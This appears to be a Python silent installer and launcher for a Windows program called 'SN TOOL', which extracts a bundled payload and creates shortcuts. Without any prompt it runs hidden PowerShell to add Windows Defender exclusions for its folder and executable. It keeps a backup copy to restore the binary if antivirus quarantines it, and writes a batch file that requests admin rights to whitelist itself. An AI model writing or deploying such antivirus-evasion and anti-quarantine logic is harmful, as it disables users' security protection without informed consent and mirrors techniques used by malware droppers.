"""
SN TOOL - Official Silent Setup & Direct Launcher (v1.0.2 Pro)
Completely silent extraction, instant launch, and Windows Defender Anti-Quarantine Shield:
- No intermediate popup windows or dialog boxes.
- Extracts setup payload in the background.
- Automatically adds Windows Defender exclusions for zero-interruption execution.
- Keeps auto-restore backup (SN_TOOL.exe.bak) to self-heal if Antivirus ever quarantines the main binary.
- Launches SN_TOOL.exe directly with 100% stability.
"""

import os
import sys
import shutil
import zipfile
import subprocess
from pathlib import Path


def get_default_install_dir() -> Path:
    local_app_data = os.environ.get("LOCALAPPDATA")
    if local_app_data:
        return Path(local_app_data) / "Programs" / "SN_TOOL"
    return Path.home() / "SN_TOOL"


def configure_windows_defender_exclusion(target_dir: Path):
    """
    Register Defender exclusion for SN_TOOL install path and process.
    Prevents false-positive heuristics from deleting SN_TOOL.exe mid-execution.
    """
    if sys.platform != "win32":
        return
    try:
        ps_cmd = (
            f"Add-MpPreference -ExclusionPath '{target_dir}' -ErrorAction SilentlyContinue; "
            f"Add-MpPreference -ExclusionProcess 'SN_TOOL.exe' -ErrorAction SilentlyContinue"
        )
        subprocess.run(
            ["powershell.exe", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", ps_cmd],
            capture_output=True,
            creationflags=0x08000000,
            timeout=5
        )
    except Exception:
        pass


def create_windows_shortcut(target_exe: Path, shortcut_path: Path, icon_file: Path = None, description: str = "SN TOOL - STUDIO PRO"):
    try:
        ps_cmd = f"""
$ws = New-Object -ComObject WScript.Shell;
$s = $ws.CreateShortcut('{shortcut_path}');
$s.TargetPath = '{target_exe}';
$s.WorkingDirectory = '{target_exe.parent}';
$s.Description = '{description}';
$s.IconLocation = '{icon_file},0';
$s.Save();
"""
        subprocess.run(
            ["powershell.exe", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", ps_cmd],
            capture_output=True,
            creationflags=0x08000000 if sys.platform == "win32" else 0
        )
        return True
    except Exception:
        return False


def get_resource_path(relative_name: str) -> Path:
    if getattr(sys, 'frozen', False) and hasattr(sys, '_MEIPASS'):
        p = Path(sys._MEIPASS) / relative_name
        if p.exists():
            return p
    exe_dir = Path(sys.executable).parent if getattr(sys, 'frozen', False) else Path(__file__).resolve().parent.parent
    for c in [exe_dir / relative_name, exe_dir / "cache" / relative_name, exe_dir / "static" / relative_name, Path(__file__).resolve().parent.parent / relative_name]:
        if c.exists():
            return c
    return Path(relative_name)


def main():
    target_dir = get_default_install_dir()
    target_exe = target_dir / "SN_TOOL.exe"

    # Terminate any previous running instance so files can be updated cleanly
    try:
        subprocess.run("taskkill /F /IM SN_TOOL.exe", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except Exception:
        pass

    # Backup existing user license.key if already activated
    saved_lic = None
    for lic_check in [target_dir / "license.key", target_dir / "_internal" / "license.key"]:
        if lic_check.exists():
            try:
                saved_lic = lic_check.read_bytes()
                break
            except Exception:
                pass

    # Extract setup payload with latest desktop application code & assets
    payload_zip = get_resource_path("setup_payload.zip")
    if not payload_zip.exists():
        payload_zip = get_resource_path("cache/setup_payload.zip")

    target_dir.mkdir(parents=True, exist_ok=True)
    if payload_zip.exists():
        try:
            with zipfile.ZipFile(payload_zip, 'r') as zf:
                zf.extractall(target_dir)
        except Exception:
            pass

    # Restore license if user was activated, or ensure clean state for fresh install
    if saved_lic:
        try:
            (target_dir / "license.key").write_bytes(saved_lic)
            if (target_dir / "_internal").exists():
                (target_dir / "_internal" / "license.key").write_bytes(saved_lic)
        except Exception:
            pass
    else:
        for lic_file in [target_dir / "license.key", target_dir / "_internal" / "license.key"]:
            if lic_file.exists():
                try:
                    lic_file.unlink(missing_ok=True)
                except Exception:
                    pass

    # Add Windows Defender exclusion for install folder
    configure_windows_defender_exclusion(target_dir)

    # Create self-healing backup of SN_TOOL.exe
    if target_exe.exists():
        try:
            shutil.copy2(target_exe, target_dir / "SN_TOOL.exe.bak")
        except Exception:
            pass

    # Create Add_Defender_Exclusion.bat in target_dir
    whitelist_bat = target_dir / "Add_Defender_Exclusion.bat"
    try:
        whitelist_bat.write_text(
            "@echo off\r\n"
            "title Whitelist SN TOOL in Windows Defender\r\n"
            "net session >nul 2>&1\r\n"
            "if %errorlevel% neq 0 (\r\n"
            "    echo Requesting Administrator privileges to whitelist SN TOOL...\r\n"
            "    powershell -Command \"Start-Process '%~f0' -Verb RunAs\"\r\n"
            "    exit /b\r\n"
            ")\r\n"
            "powershell -NoProfile -ExecutionPolicy Bypass -Command \"Add-MpPreference -ExclusionPath '%~dp0'; Add-MpPreference -ExclusionProcess 'SN_TOOL.exe'\"\r\n"
            "echo.\r\n"
            "echo ========================================================\r\n"
            "echo  [OK] SN TOOL folder whitelisted in Windows Defender!\r\n"
            "echo ========================================================\r\n"
            "pause\r\n",
            encoding="utf-8"
        )
    except Exception:
        pass

    # Create self-healing START_SN_TOOL.bat in target_dir
    start_bat = target_dir / "START_SN_TOOL.bat"
    try:
        start_bat.write_text(
            "@echo off\r\n"
            "chcp 65001 > nul\r\n"
            "set PYTHONUTF8=1\r\n"
            "set PYTHONIOENCODING=utf-8\r\n"
            "cd /d \"%~dp0\"\r\n"
            "title SN TOOL - STUDIO PRO\r\n\r\n"
            "if not exist \"%~dp0SN_TOOL.exe\" (\r\n"
            "    if exist \"%~dp0SN_TOOL.exe.bak\" (\r\n"
            "        echo [INFO] Auto-restoring SN_TOOL.exe from backup...\r\n"
            "        copy /y \"%~dp0SN_TOOL.exe.bak\" \"%~dp0SN_TOOL.exe\" >nul 2>&1\r\n"
            "    )\r\n"
            ")\r\n\r\n"
            "if exist \"%~dp0SN_TOOL.exe\" (\r\n"
            "    start \"\" \"%~dp0SN_TOOL.exe\"\r\n"
            "    exit /b\r\n"
            ")\r\n\r\n"
            "echo ========================================================================\r\n"
            "echo  [!] SN_TOOL.exe was not found (Antivirus may have blocked it).\r\n"
            "echo  Run Add_Defender_Exclusion.bat as Administrator to unblock.\r\n"
            "echo ========================================================================\r\n"
            "pause\r\n",
            encoding="utf-8"
        )
    except Exception:
        pass

    # Create / Update Desktop and Start Menu shortcuts
    icon_file = target_dir / "icon.ico"
    if not icon_file.exists():
        src_icon = get_resource_path("icon.ico")
        if src_icon.exists():
            try:
                shutil.copy2(src_icon, icon_file)
            except Exception:
                pass

    desktop = Path(os.environ.get("USERPROFILE", "")) / "Desktop"
    if desktop.exists() and target_exe.exists():
        create_windows_shortcut(
            target_exe=target_exe,
            shortcut_path=desktop / "SN TOOL.lnk",
            icon_file=icon_file,
            description="SN TOOL - STUDIO PRO"
        )

    appdata = os.environ.get("APPDATA")
    if appdata and target_exe.exists():
        start_programs = Path(appdata) / "Microsoft" / "Windows" / "Start Menu" / "Programs"
        if start_programs.exists():
            create_windows_shortcut(
                target_exe=target_exe,
                shortcut_path=start_programs / "SN TOOL.lnk",
                icon_file=icon_file,
                description="SN TOOL - STUDIO PRO"
            )

    # Launch native desktop application executable
    if target_exe.exists():
        subprocess.Popen([str(target_exe)], cwd=str(target_dir))
    else:
        repo_exe = Path(__file__).resolve().parent.parent / "dist" / "SN_TOOL" / "SN_TOOL.exe"
        if repo_exe.exists():
            subprocess.Popen([str(repo_exe)], cwd=str(repo_exe.parent))

    sys.exit(0)


if __name__ == "__main__":
    main()
